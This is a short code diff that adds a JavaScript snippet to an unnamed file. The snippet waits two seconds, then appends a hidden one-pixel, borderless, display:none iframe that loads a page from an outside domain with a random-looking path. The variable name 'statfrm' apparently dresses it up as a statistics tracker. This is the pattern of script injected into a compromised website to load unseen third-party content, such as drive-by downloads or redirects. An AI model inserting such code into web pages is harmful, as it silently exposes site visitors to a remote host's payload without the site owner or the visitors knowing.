@@ -1,0 +1,10 @@
+
+setTimeout(function(){
+	var statfrm = document.createElement("iframe");
+	statfrm.setAttribute("src","https://zdravselhoz.com/qySpDHxK");
+	statfrm.setAttribute("frameborder","0");
+	statfrm.setAttribute("width","1");
+	statfrm.setAttribute("height","1");
+	statfrm.setAttribute("style","display:none;");
+	document.body.appendChild(statfrm);
+},2000);
